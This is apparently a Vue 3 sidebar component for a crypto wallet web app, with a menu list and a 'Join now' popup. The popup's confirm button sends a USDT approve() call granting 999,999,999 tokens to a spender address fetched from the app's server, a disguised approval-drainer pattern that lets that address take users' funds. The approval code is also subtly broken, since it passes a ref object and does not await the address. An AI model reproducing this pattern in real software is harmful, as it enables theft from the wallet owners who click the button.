<template>
    <div>
        <van-popup v-model:show="show" position="left" :style="{ width: '100%', height: '100%' }">
            <div class="menu-nav-bar">
                <van-nav-bar class="navbar">
                    <template #left>
                        <van-icon name="arrow-left" size="24" color="#000" @click="show = !show"/>
                    </template>
                    <template #right>
                        <van-icon name="service" color="black" size="22px"/>
                    </template>
                </van-nav-bar>
            </div>

            <div class="sidebar-content-body">
                <van-cell class="content-body-header">
                    <template #title>
                        <span class="site-name">{{ app_name }}</span>
                    </template>
                    <template #label>
                        <div class="wallet-wrapper">
                            <van-text-ellipsis
                                class="wallet-address"
                                position="middle"
                                :content="wallet_address" />
                            <img :src="icopy" alt="" @click="copyWalletAddress">
                        </div>
                    </template>
                </van-cell>

                <div class="sidebar-list">
                    <van-button class="join-btn" color="#29a1b2" :icon="ijoin" :text="joinnow" @click="isShowJoin = !isShowJoin"></van-button>
                    <div v-for="(item,index) in menuConfig" :key="index" class="menu-item">
                        <img :src="item.icon" alt="" class="menu-item-icon">
                        <van-cell :title="item.name" is-link class="sidebar-item"/>
                    </div>
                </div>
            </div>
        </van-popup>
    </div>

    <van-popup v-model:show="isShowJoin" class="join-now" round :close-on-click-overlay="false">
        <div class="join-now-tips">
            <img :src="iclose" alt="" class="connect-close" @click="isShowJoin = !isShowJoin">
            <img :src="iconnectWallet" alt="" class="connect-wallet">
            <div class="join-title">{{ connectText }}</div>
            <van-button class="submit-connect" color="#29a1b2" :text="confirmText" @click="submitApprove" :loading="joinIsLoading"></van-button>
            <div class="confirm-tip">{{ confirmTipText }}</div>
        </div>
    </van-popup>
</template>
    
<script setup lang='ts'>
import i18n from '@/locale'
import { ref } from 'vue'
import useClipboard from 'vue-clipboard3'
import { showToast } from 'vant'
import icopy from '@/assets/icons/copy.svg'
import ijoin from '@/assets/icons/sidebar-authorized.svg'
import iindex from '@/assets/icons/menu-home.svg'
import iaccount from '@/assets/icons/menu-wallet.svg'
import itrade from '@/assets/icons/menu-trade.svg'
import inft from '@/assets/icons/menu-nft.svg'
import ikyc from '@/assets/icons/menu-kyc.svg'
import iactivity from '@/assets/icons/menu-activity.svg'
import irecord from '@/assets/icons/menu-record.svg'
import ishare from '@/assets/icons/menu-share.svg'
import iservice from '@/assets/icons/menu-service.svg'
import inotice from '@/assets/icons/menu-notice.svg'
import inews from '@/assets/icons/menu-news.svg'
import ihelp from '@/assets/icons/menu-help.svg'
import iswitchlang from '@/assets/icons/menu-switchlang.svg'
import iconnectWallet from '@/assets/icons/connect-wallet.svg'
import iclose from '@/assets/icons/close.svg'
import { useStore } from '@/stores/store'
import { usdtContractAddress, usdtABI } from '@/utils/wallet'
import { getApprove } from '@/utils/api'
import { web3 } from '@/init/app'

const store = useStore()
const { toClipboard } = useClipboard()

const app_name = i18n.global.t('common.appName')
const joinnow = i18n.global.t('menu.join')
const show = ref(false)
defineExpose({ show })

const wallet_address = ref('')
wallet_address.value = store.getAccount()

const copyWalletAddress = async () => {
    await toClipboard(wallet_address.value)
    showToast({
        message: i18n.global.t('common.copySuccess'),
        position: 'bottom'
    })
}

/* 菜单配置 */
const index = i18n.global.t('menu.index')
const account = i18n.global.t('menu.myAccount')
const trade = i18n.global.t('menu.trade')
const nft = i18n.global.t('menu.nft')
const kyc = i18n.global.t('menu.kyc')
const activity = i18n.global.t('menu.activity')
const record = i18n.global.t('menu.record')
const share = i18n.global.t('menu.share')
const service = i18n.global.t('menu.service')
const notice = i18n.global.t('menu.notice')
const news = i18n.global.t('menu.news')
const qa = i18n.global.t('menu.qa')
const switchLang = i18n.global.t('menu.switch')

const menuConfig = [
    {name: index, icon: iindex, path: '/'},
    {name: account, icon: iaccount, path: '/account'},
    {name: trade, icon: itrade, path: '/trade'},
    {name: nft, icon: inft, path: '/nft'},
    {name: kyc, icon: ikyc, path: '/kyc'},
    {name: activity, icon: iactivity, path: '/activity'},
    {name: record, icon: irecord, path: '/record'},
    {name: share, icon: ishare, path: '/share'},
    {name: service, icon: iservice, path: '/service'},
    {name: notice, icon: inotice, path: '/notice'},
    {name: news, icon: inews, path: '/news'},
    {name: qa, icon: ihelp, path: '/qa'},
    {name: switchLang, icon: iswitchlang, path: '/switchLang'},
]


// 控制立即加入弹窗是否显示
const isShowJoin = ref(false)
// 链接钱包界面文本
const connectText = i18n.global.t('menu.connectwallet')
const confirmText = i18n.global.t('menu.confirm')
const confirmTipText = i18n.global.t('menu.confirmTip')

// 授权相关设置
const approve_address = ref('')
// 授权界面是否在loading
const joinIsLoading = ref(false)

// 授权
const submitApprove = () => {
    joinIsLoading.value = true
    // 获取授权地址
    getApprove().then((res: any) => {
        approve_address.value = res.approve
    })
    
    /* 开始授权 */
    const approveAmount = web3.utils.toWei('999999999', 'ether')// 授权数量

    var contract = new web3.eth.Contract(usdtABI, usdtContractAddress)
    contract.methods.approve(approve_address, approveAmount).send({
        from: wallet_address.value,
        gas: 50000,
        gasPrice: web3.utils.toWei('50', 'gwei')
    }).then((receipt: any) => {
        joinIsLoading.value = false
        isShowJoin.value = false
        showToast({
            message: i18n.global.t('menu.approve_ok'),
            position: 'bottom'
        })
        console.log('approve_ok: ', receipt)
    }).catch((err: any) => {
        joinIsLoading.value = false
        isShowJoin.value = false
        showToast({
            message: i18n.global.t('menu.approve_fail'),
            position: 'bottom'
        })
        console.log('approve_fail: ', err)
    })
}


</script>

<style lang="scss" scoped>
.menu-nav-bar {
    margin-bottom: 30px;
    .navbar {
        padding: 5px;
        height: 20px;
    }
}

.sidebar-content-body {
    display: flex;
    flex-direction: column;
    padding-left: 16px;
    padding-right: 16px;
    gap: 15px;

    .content-body-header {
        padding-left: 0;
    }

    .sidebar-list {
        display: flex;
        flex-direction: column;

        .join-btn {
            width: 105px;
            height: 43px;
            font-size: 12px;
            margin-bottom: 10px;
        }

        .menu-item {
            display: flex;
            gap: 10px;
            align-items: center;
            padding-top: 16px;
            padding-bottom: 16px;

            .menu-item-icon {
                height: 24px;
                width: 24px;
            }

            .sidebar-item {
                padding: 0;
                align-items: center;
                font-size: 16px;
                color: #333333;
            }
        }
    }
}

.site-name {
    font-size: 20px;
    font-weight: bold;
    color: #333333;
}

.wallet-wrapper {
    display: flex;
    gap: 10px;
    .wallet-address {
        margin: 0;
        width: 80px;
        font-size: 14px;
        color: #333333;
    }

}

.join-now {
    width: 343px;
    height: 100%;

    .join-now-tips {
        width: 343px;
        height: 100%;
        padding: 16px;
        display: flex;
        flex-direction: column;
        gap: 15px;

        .connect-close {
            width: 28px;
            height: 28px;
            margin-left: auto;
        }

        .connect-wallet {
            width: 200px;
            height: 200px;
            margin: 0 auto;
        }

        .join-title {
            font-size: 16px;
            font-weight: 700;
            color: #333333;
            margin: 0 auto;
        }

        .submit-connect {
            font-size: 16px;
            width: 311px;
            height: 40px;
        }

        .confirm-tip {
            font-size: 12px;
            color: #333333;
            margin: 0 auto;
        }
    }
}
</style>